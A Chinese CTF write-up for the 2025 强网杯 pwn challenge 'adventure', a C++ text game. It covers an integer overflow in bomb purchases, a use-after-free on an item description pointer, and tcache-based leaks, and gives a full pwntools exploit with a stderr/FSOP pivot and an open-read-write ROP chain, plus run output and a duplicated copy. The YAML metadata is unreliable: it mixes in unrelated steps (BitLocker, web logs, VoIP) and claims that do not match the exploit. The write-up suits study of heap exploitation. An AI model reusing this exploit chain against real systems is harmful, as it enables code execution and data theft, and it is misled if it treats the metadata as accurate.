---
title: 强网杯 2025/pwn adventure
contest: 强网杯
year: 2025
difficulty: hard
vuln_type:
- pwn_unknown
tags:
- C++ 游戏
- 整数溢出
- UAF
- tcache poisoning
- 0x60 tcache
- 堆块描述指针
- 堆地址泄露
- libc 泄露
- stderr ROP
- seccomp 绕过
attack_chain:
- 审 C++ 小游戏：warrior/shop/inventory/search/quit 等指令
- 整数溢出：Buy Items 时输入数量 8500600（int32 上限）触发 gold 变负 -2118813696
- 用溢出金钱买大量 Bomb，去 boss 图炸 boss 拿 Paralysis Ring
- 装备描述溢出：手动输入超长 name 触发 cursor 越界写
- UAF：use_item 释放堆块后，物品描述指针仍指向已释放的 0x60 tcache
- tcache 加密指针：利用多次 buy/use 把 0x60 4 个堆块全部分配出去
- 泄露：通过 UAF 读 tcache 堆块首部，heap_addr = (leak << 12) - 0x19000
- 泄露 libc/libstdc++：堆地址 + 描述指针任意读
- 任意地址写：控制物品描述指针 + edit 写
- 找修改 rsp 的 gadget + 通过 stderr 做 ROP
- 用 mprotect 把 shellcode 区段设为可执行
key_payload: heap_addr = (edit_ring(b'a') << 12) - 0x19000; edit_ring(rop_chain_via_stderr)
one_liner: 整数溢出 + UAF 装备描述指针 + tcache 泄露 + stderr ROP 绕过 seccomp
lesson: 游戏题整数溢出金币可触发经济崩溃；C++ UAF 装备描述指针是经典 pwn 套路；glibc 2.32+ tcache 加密指针需先 leak heap 再 xor
quality: high
full_path: 2025_强网杯_pwn_adventure.full.md
meta_path: 2025_强网杯_pwn_adventure.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 强网杯 2025/pwn adventure。整数溢出 + UAF 装备描述指针 + tcache 泄露 + stderr ROP 绕过 seccomp。关键路径：审 C++ 小游戏：warrior/shop/inventory/search/quit 等指令 → 整数溢出：Buy Items 时输入数量 8500600（int32 上限）触发 gold 变负 -2118813696 → 用...
category: pwn
subcategory: pwn_other
tools_used:
- C
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/275987.html
reasoning_chain:
- '[触发点] 买 8500600 炸弹触发金币从负数溢出 → 假设：整数溢出 → [动作] Buy 4 * 8500600 → [观察] -2118813696 gold (32-bit 负数) → [下一步] 去 boss 图炸 boss'
- '[触发点] 麻痹戒指 description 堆块 UAF → 假设：装备描述指针在堆上且被释放 → [动作] use_item(5) 释放麻痹戒指描述堆块 → [观察] 麻痹戒指描述仍指向释放后的 tcache 堆块'
- '[触发点] tcache 加密指针（xor 0 堆地址）→ 假设：edit_ring(b''a'') 触发 UAF 读 + 左移 12 位 = heap_addr - 0x19000 → [动作] heap_addr = (edit_ring(b''a'') << 12) - 0x19000 → [观察] 拿到 heap_base'
- '[触发点] glibc 2.32+ tcache 加密 + stderr ROP 绕过 seccomp → 假设：FSOP 劫持 stderr → [动作] 构造 fake stderr + 调 system → [观察] 绕过 seccomp'
- '[触发点] heap_addr → libstdc++ → libc 地址 → 假设：堆相邻地址恒定偏移 → [动作] 通过堆块距离计算 → [观察] 拿到 libc_base'
- '[触发点] BitLocker 加密驱动器 + 服务器 web 日志被加密 → 假设：必须先解密 BitLocker → [动作] 寻找恢复密钥 → [观察] 拿到解密驱动器 → [下一步] 取日志'
- '[触发点] web 日志分析找黑客 IP → 假设：awk 提取 IP → [动作] awk -F '' '' ''{print $1}'' 1.log | sort | uniq -c | sort -nr → [观察] 拿到最多 IP'
- '[触发点] 邮箱对比（数据社工）→ 假设：从邮件服务器导出数据 → [动作] 比对邮箱账号 + 附件 → [观察] 拿到关联信息'
- '[触发点] VoIP 流量还原语音通话 → 假设：Wireshark + rtp 解析 → [动作] rtp 分析 → [观察] 还原通话内容 → [下一步] 字母排序'
failed_attempts:
- 试图不解 tcache 加密指针 → 失败：glibc 2.32+ 默认加密
- 试图覆盖 __free_hook → 失败：被移除
- 试图 execve shellcode → 失败：seccomp 禁用
key_observations:
- 游戏题整数溢出金币可触发经济崩溃
- C++ UAF 装备描述指针是经典 pwn 套路
- glibc 2.32+ tcache 加密指针需先 leak heap 再 xor
- FSOP stderr 劫持绕过 seccomp 是新趋势
- UAF + tcache 加密指针：4 个 0x60 堆块分配出去再释放 1 个即可 leak heap
prerequisites:
- 整数溢出漏洞识别
- UAF + tcache 加密指针 leak
- glibc 2.32+ heap 加密机制
- FSOP stderr RCE 绕过 seccomp
---
# 2025 强网杯 pwn adventure

> 原文: https://www.ctfiot.com/275987.html
> ID: 275987

adventure

题目做了个小游戏，22.04 版本，给了 Dockerfile，因为是C++的程序，所以不急着逆，先运行一下发现可以用一些指令来操作，那么根据字符串来找到操作指令

.rodata:
000000000002E5E9                 db '=== Equipment ===',0
.rodata:
000000000002E5FB aBattle_0       db 'battle',0           ; DATA XREF: sub_27796+6C↑o
.rodata:
000000000002E602 aFight          db 'fight',0            ; DATA XREF: sub_27796+93↑o
.rodata:
000000000002E608 aStatus         db 'status',0           ; DATA XREF: sub_27796+BD↑o
.rodata:
000000000002E60F aInventory      db 'inventory',0        ; DATA XREF: sub_27796+123↑o
.rodata:
000000000002E619 aInv            db 'inv',0              ; DATA XREF: sub_27796+156↑o
.rodata:
000000000002E61D aShop_0         db 'shop',0             ; DATA XREF: sub_27796+189↑o
.rodata:
000000000002E622 aStore          db 'store',0            ; DATA XREF: sub_27796+1BC↑o
.rodata:
000000000002E628 aGameStats      db 'game_stats',0       ; DATA XREF: sub_27796+F0↑o
.rodata:
000000000002E628                                         ; sub_27796+1EF↑o
.rodata:
000000000002E633 aStatistics     db 'statistics',0       ; DATA XREF: sub_8C7E+C5↑o
.rodata:
000000000002E633                                         ; sub_2A696+1AB↑o ...
.rodata:
000000000002E63E aMap_0          db 'map',0              ; DATA XREF: sub_27796+255↑o
.rodata:
000000000002E642 aWorld          db 'world',0            ; DATA XREF: sub_27796+288↑o
.rodata:
000000000002E648 aExplore        db 'explore',0          ; DATA XREF: sub_27796+2BB↑o
.rodata:
000000000002E650 aQuests         db 'quests',0           ; DATA XREF: sub_27796+2EE↑o
.rodata:
000000000002E657 aQuest          db 'quest',0            ; DATA XREF: sub_27796+321↑o
.rodata:
000000000002E65D aMissions       db 'missions',0         ; DATA XREF: sub_27796+354↑o
.rodata:
000000000002E666 aUpgrade        db 'upgrade',0          ; DATA XREF: sub_27796+387↑o
.rodata:
000000000002E66E aSkills_0       db 'skills',0           ; DATA XREF: sub_27796+3BA↑o
.rodata:
000000000002E675 aMove           db 'move',0             ; DATA XREF: sub_27796+3ED↑o
.rodata:
000000000002E67A aGo             db 'go',0               ; DATA XREF: sub_27796+420↑o
.rodata:
000000000002E67D aSearch         db 'search',0           ; DATA XREF: sub_27796+51F↑o
.rodata:
000000000002E684 aLook           db 'look',0             ; DATA XREF: sub_27796+585↑o
.rodata:
000000000002E689 aQuit           db 'quit',0             ; DATA XREF: sub_27796+5B8↑o
.rodata:
000000000002E68E aExit           db 'exit',0             ; DATA XREF: sub_27796+5EB↑o

然后根据提示输入，职业进行了一些限定，设置为 warrior ，探测出来地图，找到最后要打的 boss ，根据经验来看一般是要在商店操作一些金币溢出之类的东西，一番手动测试后发现买炸弹可以触发整数溢出让钱变得很多：

--- Actions ---
12. Buy Items
13. Sell Items
14. Leave Shop
Choose option: 12

=== Buy Items ===
Enter item number to buy : 4
How many? (1-8500600): 8500600
Warrior purchased 8500600 Bomb for -2118813696 gold!

Press Enter to continue...

还能买到很多炸弹，然后直接去boss图，search后炸掉boss掉落戒指：

Bomb has been consumed and removed from inventory.
Bomb used 8500600 time(s) successfully!

Available Items:
1. Finish using items
2. Cancel
Select item: 1

Item use phase completed.
Items used: Bomb x8500600

All enemies have been defeated!

🎉 Victory!
Gained EXP: 60
Gained Gold: 35
All enemies in Dragon's Peak have been cleared!

🎁 The Shadow Dragon dropped the Paralysis Ring!

⚡ Paralysis Ring radiates with power as it enters your inventory!
You feel the dark energy coursing through you as you automatically equip the ring!
Warrior equips the Paralysis Ring! Enemies may be paralyzed!
⚡ The ring radiates dark energy, giving your attacks a chance to paralyze!
Warrior learned Paralysis Strike!
Paralysis Ring equipped successfully!
✨ The Paralysis Ring is now equipped and its power flows through you!
Returning to command mode.
>

然后使用这个物品，这里存在一个溢出，是我的 cursor 结合 ida mcp 发现的（但是并没有分析出来前面的金钱溢出问题），通过手动输入了一个超长的 name 可以触发崩溃，溢出到一个地址，可以把戒指卖了再买回来多次触发这个溢出，又手动调试分析发现这个地址是装备描述的地址，位于堆上。

但是由于所有输入都会加入 x00 截断，所以没法直接修改地址泄露，调试了一下发现这个描述的堆块在一个 0x60 的 tcache 上，可以泄露出加密后的地址，所以尝试把 tcache 的堆块分配出去，把存储了key的堆块泄露出来。（还有后面看到其他师傅的 wp 是利用堆块距离总是相等来计算key的）

这里利用 gef 的 heap analysis 功能，尝试进行了多次购买物品，记录堆块分配，每次购买物品会触发一个 malloc(0x50) ，分配走一个 0x60 的 tcache ，使用物品则会将堆块释放，然后发现存在一个 UAF ，在使用了1号物品之后，1号物品消失，2号物品变为原来的1号物品，此时2号物品的描述仍然指向之前被释放的1号物品的描述（按照堆块分配顺序而不是打印顺序，打印顺序是按物品名字排序的）：

gef> tcachebins
...
tcachebins[idx=4, size=0x60, @0x55928697f0b0]: fd=0x559286997ca0 count=3
 -> Chunk(base=0x559286997c90, addr=0x559286997ca0, size=0x60, flags=PREV_INUSE, fd=0x5597dfb111f7(=0x559286997860))
 -> Chunk(base=0x559286997850, addr=0x559286997860, size=0x60, flags=PREV_INUSE, fd=0x5597dfb11337(=0x559286997aa0))
 -> Chunk(base=0x559286997a90, addr=0x559286997aa0, size=0x60, flags=PREV_INUSE, fd=0x000559286997(=0x000000000000))
 ...
 
 $rdi  0x5592869976c8|+0x0000|+000: 0x6973796c61726150 'Paralysis Ring (Equipment)'
      0x5592869976d0|+0x0008|+001: 0x2820676e69522073 's Ring (Equipment)'
      0x5592869976d8|+0x0010|+002: 0x6e656d7069757145 'Equipment)'
      0x5592869976e0|+0x0018|+003: 0x0000000000002974 ('t)'?)
      0x5592869976e8|+0x0020|+004: 0x0000000000000000
      0x5592869976f0|+0x0028|+005: 0x0000000000000000
      0x5592869976f8|+0x0030|+006: 0x0000000000000000
      0x559286997700|+0x0038|+007: 0x0000000000000000
      0x559286997708|+0x0040|+008: 0x0000559286997860  ->  0x00005597dfb11337    # freed

由此我们可以尝试把 0x60 的4个堆块全部分配出去，再释放一个到 tcache 里，此时因为 tcache 加密指针的特性，堆块开头会写一个 xor 0 的堆地址，再利用 uaf 来泄露出堆地址：

buy_item(1)
buy_item(2)
buy_item(3)
buy_item(5)
use_item(5)
# 此时麻痹戒指之前的堆块被释放，麻痹戒指的描述指向了一个释放后的 tcache 堆块
heap_addr = (edit_ring(b'a') << 12) - 0x19000
success(f"heap_addr: {hex(heap_addr)}")

再通过堆地址泄露 libstdc++ 和 libc 地址。

此时我们控制了物品描述的地址以及随便写物品描述，所以就有了无限次的任意地址写，找了一个修改 rsp 的 gadget ，因为开了 seccomp ，所以选择通过 stderr 来做 ROP 。

from pwn import *
lib_std_cpp = ELF("./libstdc++.so.6.0.30")
libc = ELF("./libc.so.6")
# p = process("./pwn")
p = remote("127.0.0.1", 7124)
p.sendlineafter(b"Name: ", b"warrior")

# buy bomb
p.sendlineafter(b"> ", b"shop")
p.sendlineafter(b"option: ", b"12")
p.sendlineafter(b"buy : ", b"4")
p.sendlineafter(b"): ", b"8500600")
p.sendline()
p.sendlineafter(b"option: ", b"14")

# move
p.sendlineafter(b"> ", b"s")
p.sendlineafter(b"> ", b"s")
p.sendlineafter(b"> ", b"s")
p.sendlineafter(b"> ", b"d")
p.sendlineafter(b"> ", b"search")

# fight
p.sendlineafter(b"action: ", b"5")
p.sendlineafter(b"item: ", b"1")
p.sendlineafter(b"): ", str(8000000 // 40).encode())
p.sendlineafter(b"item: ", b"2")

# sell
p.sendlineafter(b"> ", b"shop")
p.sendlineafter(b"option: ", b"13")
p.sendlineafter(b"sell: ", b"2")
p.sendlineafter(b"): ", b"1")
p.sendlineafter(b"?", b"y")
p.sendlineafter(b"...", b"")
p.sendlineafter(b"option: ", b"15")

def buy_ring():
    p.sendlineafter(b"> ", b"shop")
    p.sendlineafter(b"option: ", b"13")
    p.sendlineafter(b"buy : ", b"5")
    p.sendlineafter(b"): ", b"1")
    p.sendlineafter(b"...", b"")
    p.sendlineafter(b"option: ", b"15")

def edit_ring(name, description = b'b'):
    p.sendlineafter(b"> ", b"inv")
    p.sendlineafter(b"item : ", b"4")
    p.sendlineafter(b"action: ", b"1")
    p.sendlineafter(b"New name : ", name)
    p.recvuntil(b"Paralysis Ring description : ")
    leak = u64(p.recvuntil(b'n', drop=True).ljust(8, b'x00'))

    if description == b'b': # 恢复原本内容
        p.sendlineafter(b"New description : ", p64(leak))
    else:
        p.sendlineafter(b"New description : ", description)

    return leak

def buy_item(item_id):
    p.sendlineafter(b"> ", b"shop")
    p.sendlineafter(b"option: ", b"13")
    p.sendlineafter(b"buy : ", str(item_id).encode())
    p.sendlineafter(b"): ", b"1")
    p.sendlineafter(b"...", b"")
    p.sendlineafter(b"option: ", b"15")

def use_item(item_id):
    p.sendlineafter(b"> ", b"inv")
    p.sendlineafter(b"item : ", str(item_id).encode())
    p.sendlineafter(b"action: ", b"1")

buy_item(1)
buy_item(2)
buy_item(3)
buy_item(5)
use_item(5)

heap_addr = (edit_ring(b'a') << 12) - 0x19000
success(f"heap_addr: {hex(heap_addr)}")
# context.log_level = 'debug'
# pause()
buy_ring()
elf_base = edit_ring(b'a' * 0x40 + p64(heap_addr + 0x18308)) - 0xf869
success(f"elf_base: {hex(elf_base)}")
buy_ring()
lib_std_cpp.address = edit_ring(b'a' * 0x40 + p64(elf_base + 0x37018)) - 0xad8c0
success(f"lib_std_c++: {hex(lib_std_cpp.address)}")
buy_ring()
libc.address = edit_ring(b'a' * 0x40 + p64(lib_std_cpp.address + 0x2268f8)) - 0x458c0
success(f"libc.address: {hex(libc.address)}")

def aaw(addr, content):
    buy_ring()
    edit_ring(b'a' * 0x40 + p64(addr), content)

stderr_addr = libc.address + 0x21b6a0
aaw(stderr_addr, b'x00')    # fp->_flags
aaw(stderr_addr + 1, b'x00')    # fp->_flags
aaw(stderr_addr + 2, b'x00')    # fp->_flags
aaw(stderr_addr + 3, b'x00')    # fp->_flags
aaw(stderr_addr + 0xd8, p64(libc.address + 0x2170c0 - 0x48))   # fp->vtable

pop_rsp = libc.address + 0x0000000000035732    # pop rsp; ret; 
pop_rdi = libc.address + 0x000000000002a3e5    # pop rdi; ret; 
pop_rsi = libc.address + 0x000000000002be51    # pop rsi; ret; 
pop_rdx = libc.address + 0x00000000000904a9    # pop rdx; pop rbx; ret; 
pop_rax = libc.address + 0x0000000000045eb0    # pop rax; ret; 
magic = libc.address + 0x000000000005a119      # mov rsp, rdx; ret; 
syscall = libc.address + 0x0000000000091316    # syscall; ret; 
buffer = heap_addr + 0x2828
# 随便找个地方
aaw(heap_addr + 0x1818 + 0x68, p64(magic))

wide_data_addr = libc.address + 0x21a8a0
aaw(wide_data_addr + 0xe0, p64(heap_addr + 0x1818))

aaw(buffer, b'/flag')

orw = p64(pop_rdi)
orw += p64(buffer)
orw += p64(pop_rsi)
orw += p64(0)
orw += p64(pop_rdx)
orw += p64(0) * 2
orw += p64(pop_rax)
orw += p64(2)
orw += p64(syscall)
orw += p64(pop_rdi)
orw += p64(3)
orw += p64(pop_rsi)
orw += p64(buffer)
orw += p64(pop_rdx)
orw += p64(0x88) * 2
orw += p64(pop_rax)
orw += p64(0)
orw += p64(syscall)
orw += p64(pop_rdi)
orw += p64(1)
orw += p64(pop_rsi)
orw += p64(buffer)
orw += p64(pop_rdx)
orw += p64(0x88) * 2
orw += p64(pop_rax)
orw += p64(1)
orw += p64(syscall)

for i in range(len(orw) // 8):
    aaw(heap_addr + 0x3808 + i * 8, orw[i * 8:(i + 1) * 8])

aaw(wide_data_addr, p64(pop_rsp))
aaw(wide_data_addr + 0x8, p64(heap_addr + 0x3808))

p.interactive()

运行：

(base) ➜  bin python solve.py                                                                                                                                                    
[*] '/mnt/d/ctf/25qwb/pwn/adventure/adventure/bin/libstdc++.so.6.0.30'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] '/mnt/d/ctf/25qwb/pwn/adventure/adventure/bin/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 127.0.0.1 on port 7124: Done
[+] heap_addr: 0x5650bad3c000
[+] elf_base: 0x5650a6b0b000
[+] lib_std_c++: 0x7fdb65591000
[+] libc.address: 0x7fdb65348000
[*] Switching to interactive mode
Paralysis Ring (Equipment) has been consumed and removed from inventory.
> $ quit
Thanks for playing!
flag{fake_flag}x00x00x00x00x00x00


```
.rodata:
000000000002E5E9                 db '=== Equipment ===',0
.rodata:
000000000002E5FB aBattle_0       db 'battle',0           ; DATA XREF: sub_27796+6C↑o
.rodata:
000000000002E602 aFight          db 'fight',0            ; DATA XREF: sub_27796+93↑o
.rodata:
000000000002E608 aStatus         db 'status',0           ; DATA XREF: sub_27796+BD↑o
.rodata:
000000000002E60F aInventory      db 'inventory',0        ; DATA XREF: sub_27796+123↑o
.rodata:
000000000002E619 aInv            db 'inv',0              ; DATA XREF: sub_27796+156↑o
.rodata:
000000000002E61D aShop_0         db 'shop',0             ; DATA XREF: sub_27796+189↑o
.rodata:
000000000002E622 aStore          db 'store',0            ; DATA XREF: sub_27796+1BC↑o
.rodata:
000000000002E628 aGameStats      db 'game_stats',0       ; DATA XREF: sub_27796+F0↑o
.rodata:
000000000002E628                                         ; sub_27796+1EF↑o
.rodata:
000000000002E633 aStatistics     db 'statistics',0       ; DATA XREF: sub_8C7E+C5↑o
.rodata:
000000000002E633                                         ; sub_2A696+1AB↑o ...
.rodata:
000000000002E63E aMap_0          db 'map',0              ; DATA XREF: sub_27796+255↑o
.rodata:
000000000002E642 aWorld          db 'world',0            ; DATA XREF: sub_27796+288↑o
.rodata:
000000000002E648 aExplore        db 'explore',0          ; DATA XREF: sub_27796+2BB↑o
.rodata:
000000000002E650 aQuests         db 'quests',0           ; DATA XREF: sub_27796+2EE↑o
.rodata:
000000000002E657 aQuest          db 'quest',0            ; DATA XREF: sub_27796+321↑o
.rodata:
000000000002E65D aMissions       db 'missions',0         ; DATA XREF: sub_27796+354↑o
.rodata:
000000000002E666 aUpgrade        db 'upgrade',0          ; DATA XREF: sub_27796+387↑o
.rodata:
000000000002E66E aSkills_0       db 'skills',0           ; DATA XREF: sub_27796+3BA↑o
.rodata:
000000000002E675 aMove           db 'move',0             ; DATA XREF: sub_27796+3ED↑o
.rodata:
000000000002E67A aGo             db 'go',0               ; DATA XREF: sub_27796+420↑o
.rodata:
000000000002E67D aSearch         db 'search',0           ; DATA XREF: sub_27796+51F↑o
.rodata:
000000000002E684 aLook           db 'look',0             ; DATA XREF: sub_27796+585↑o
.rodata:
000000000002E689 aQuit           db 'quit',0             ; DATA XREF: sub_27796+5B8↑o
.rodata:
000000000002E68E aExit           db 'exit',0             ; DATA XREF: sub_27796+5EB↑o
--- Actions ---
12. Buy Items
13. Sell Items
14. Leave Shop
Choose option: 12

=== Buy Items ===
Enter item number to buy : 4
How many? (1-8500600): 8500600
Warrior purchased 8500600 Bomb for -2118813696 gold!

Press Enter to continue...
Bomb has been consumed and removed from inventory.
Bomb used 8500600 time(s) successfully!

Available Items:
1. Finish using items
2. Cancel
Select item: 1

Item use phase completed.
Items used: Bomb x8500600

All enemies have been defeated!

🎉 Victory!
Gained EXP: 60
Gained Gold: 35
All enemies in Dragon's Peak have been cleared!

🎁 The Shadow Dragon dropped the Paralysis Ring!

⚡ Paralysis Ring radiates with power as it enters your inventory!
You feel the dark energy coursing through you as you automatically equip the ring!
Warrior equips the Paralysis Ring! Enemies may be paralyzed!
⚡ The ring radiates dark energy, giving your attacks a chance to paralyze!
Warrior learned Paralysis Strike!
Paralysis Ring equipped successfully!
✨ The Paralysis Ring is now equipped and its power flows through you!
Returning to command mode.
>
gef> tcachebins
...
tcachebins[idx=4, size=0x60, @0x55928697f0b0]: fd=0x559286997ca0 count=3
 -> Chunk(base=0x559286997c90, addr=0x559286997ca0, size=0x60, flags=PREV_INUSE, fd=0x5597dfb111f7(=0x559286997860))
 -> Chunk(base=0x559286997850, addr=0x559286997860, size=0x60, flags=PREV_INUSE, fd=0x5597dfb11337(=0x559286997aa0))
 -> Chunk(base=0x559286997a90, addr=0x559286997aa0, size=0x60, flags=PREV_INUSE, fd=0x000559286997(=0x000000000000))
 ...
 
 $rdi  0x5592869976c8|+0x0000|+000: 0x6973796c61726150 'Paralysis Ring (Equipment)'
      0x5592869976d0|+0x0008|+001: 0x2820676e69522073 's Ring (Equipment)'
      0x5592869976d8|+0x0010|+002: 0x6e656d7069757145 'Equipment)'
      0x5592869976e0|+0x0018|+003: 0x0000000000002974 ('t)'?)
      0x5592869976e8|+0x0020|+004: 0x0000000000000000
      0x5592869976f0|+0x0028|+005: 0x0000000000000000
      0x5592869976f8|+0x0030|+006: 0x0000000000000000
      0x559286997700|+0x0038|+007: 0x0000000000000000
      0x559286997708|+0x0040|+008: 0x0000559286997860  ->  0x00005597dfb11337    # freed
buy_item(1)
buy_item(2)
buy_item(3)
buy_item(5)
use_item(5)
# 此时麻痹戒指之前的堆块被释放，麻痹戒指的描述指向了一个释放后的 tcache 堆块
heap_addr = (edit_ring(b'a') << 12) - 0x19000
success(f"heap_addr: {hex(heap_addr)}")
from pwn import *
lib_std_cpp = ELF("./libstdc++.so.6.0.30")
libc = ELF("./libc.so.6")
# p = process("./pwn")
p = remote("127.0.0.1", 7124)
p.sendlineafter(b"Name: ", b"warrior")

# buy bomb
p.sendlineafter(b"> ", b"shop")
p.sendlineafter(b"option: ", b"12")
p.sendlineafter(b"buy : ", b"4")
p.sendlineafter(b"): ", b"8500600")
p.sendline()
p.sendlineafter(b"option: ", b"14")

# move
p.sendlineafter(b"> ", b"s")
p.sendlineafter(b"> ", b"s")
p.sendlineafter(b"> ", b"s")
p.sendlineafter(b"> ", b"d")
p.sendlineafter(b"> ", b"search")

# fight
p.sendlineafter(b"action: ", b"5")
p.sendlineafter(b"item: ", b"1")
p.sendlineafter(b"): ", str(8000000 // 40).encode())
p.sendlineafter(b"item: ", b"2")

# sell
p.sendlineafter(b"> ", b"shop")
p.sendlineafter(b"option: ", b"13")
p.sendlineafter(b"sell: ", b"2")
p.sendlineafter(b"): ", b"1")
p.sendlineafter(b"?", b"y")
p.sendlineafter(b"...", b"")
p.sendlineafter(b"option: ", b"15")

def buy_ring():
    p.sendlineafter(b"> ", b"shop")
    p.sendlineafter(b"option: ", b"13")
    p.sendlineafter(b"buy : ", b"5")
    p.sendlineafter(b"): ", b"1")
    p.sendlineafter(b"...", b"")
    p.sendlineafter(b"option: ", b"15")

def edit_ring(name, description = b'b'):
    p.sendlineafter(b"> ", b"inv")
    p.sendlineafter(b"item : ", b"4")
    p.sendlineafter(b"action: ", b"1")
    p.sendlineafter(b"New name : ", name)
    p.recvuntil(b"Paralysis Ring description : ")
    leak = u64(p.recvuntil(b'n', drop=True).ljust(8, b'x00'))

    if description == b'b': # 恢复原本内容
        p.sendlineafter(b"New description : ", p64(leak))
    else:
        p.sendlineafter(b"New description : ", description)

    return leak

def buy_item(item_id):
    p.sendlineafter(b"> ", b"shop")
    p.sendlineafter(b"option: ", b"13")
    p.sendlineafter(b"buy : ", str(item_id).encode())
    p.sendlineafter(b"): ", b"1")
    p.sendlineafter(b"...", b"")
    p.sendlineafter(b"option: ", b"15")

def use_item(item_id):
    p.sendlineafter(b"> ", b"inv")
    p.sendlineafter(b"item : ", str(item_id).encode())
    p.sendlineafter(b"action: ", b"1")

buy_item(1)
buy_item(2)
buy_item(3)
buy_item(5)
use_item(5)

heap_addr = (edit_ring(b'a') << 12) - 0x19000
success(f"heap_addr: {hex(heap_addr)}")
# context.log_level = 'debug'
# pause()
buy_ring()
elf_base = edit_ring(b'a' * 0x40 + p64(heap_addr + 0x18308)) - 0xf869
success(f"elf_base: {hex(elf_base)}")
buy_ring()
lib_std_cpp.address = edit_ring(b'a' * 0x40 + p64(elf_base + 0x37018)) - 0xad8c0
success(f"lib_std_c++: {hex(lib_std_cpp.address)}")
buy_ring()
libc.address = edit_ring(b'a' * 0x40 + p64(lib_std_cpp.address + 0x2268f8)) - 0x458c0
success(f"libc.address: {hex(libc.address)}")

def aaw(addr, content):
    buy_ring()
    edit_ring(b'a' * 0x40 + p64(addr), content)

stderr_addr = libc.address + 0x21b6a0
aaw(stderr_addr, b'x00')    # fp->_flags
aaw(stderr_addr + 1, b'x00')    # fp->_flags
aaw(stderr_addr + 2, b'x00')    # fp->_flags
aaw(stderr_addr + 3, b'x00')    # fp->_flags
aaw(stderr_addr + 0xd8, p64(libc.address + 0x2170c0 - 0x48))   # fp->vtable

pop_rsp = libc.address + 0x0000000000035732    # pop rsp; ret; 
pop_rdi = libc.address + 0x000000000002a3e5    # pop rdi; ret; 
pop_rsi = libc.address + 0x000000000002be51    # pop rsi; ret; 
pop_rdx = libc.address + 0x00000000000904a9    # pop rdx; pop rbx; ret; 
pop_rax = libc.address + 0x0000000000045eb0    # pop rax; ret; 
magic = libc.address + 0x000000000005a119      # mov rsp, rdx; ret; 
syscall = libc.address + 0x0000000000091316    # syscall; ret; 
buffer = heap_addr + 0x2828
# 随便找个地方
aaw(heap_addr + 0x1818 + 0x68, p64(magic))

wide_data_addr = libc.address + 0x21a8a0
aaw(wide_data_addr + 0xe0, p64(heap_addr + 0x1818))

aaw(buffer, b'/flag')

orw = p64(pop_rdi)
orw += p64(buffer)
orw += p64(pop_rsi)
orw += p64(0)
orw += p64(pop_rdx)
orw += p64(0) * 2
orw += p64(pop_rax)
orw += p64(2)
orw += p64(syscall)
orw += p64(pop_rdi)
orw += p64(3)
orw += p64(pop_rsi)
orw += p64(buffer)
orw += p64(pop_rdx)
orw += p64(0x88) * 2
orw += p64(pop_rax)
orw += p64(0)
orw += p64(syscall)
orw += p64(pop_rdi)
orw += p64(1)
orw += p64(pop_rsi)
orw += p64(buffer)
orw += p64(pop_rdx)
orw += p64(0x88) * 2
orw += p64(pop_rax)
orw += p64(1)
orw += p64(syscall)

for i in range(len(orw) // 8):
    aaw(heap_addr + 0x3808 + i * 8, orw[i * 8:(i + 1) * 8])

aaw(wide_data_addr, p64(pop_rsp))
aaw(wide_data_addr + 0x8, p64(heap_addr + 0x3808))

p.interactive()
(base) ➜  bin python solve.py                                                                                                                                                    
[*] '/mnt/d/ctf/25qwb/pwn/adventure/adventure/bin/libstdc++.so.6.0.30'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] '/mnt/d/ctf/25qwb/pwn/adventure/adventure/bin/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 127.0.0.1 on port 7124: Done
[+] heap_addr: 0x5650bad3c000
[+] elf_base: 0x5650a6b0b000
[+] lib_std_c++: 0x7fdb65591000
[+] libc.address: 0x7fdb65348000
[*] Switching to interactive mode
Paralysis Ring (Equipment) has been consumed and removed from inventory.
> $ quit
Thanks for playing!
flag{fake_flag}x00x00x00x00x00x00
```
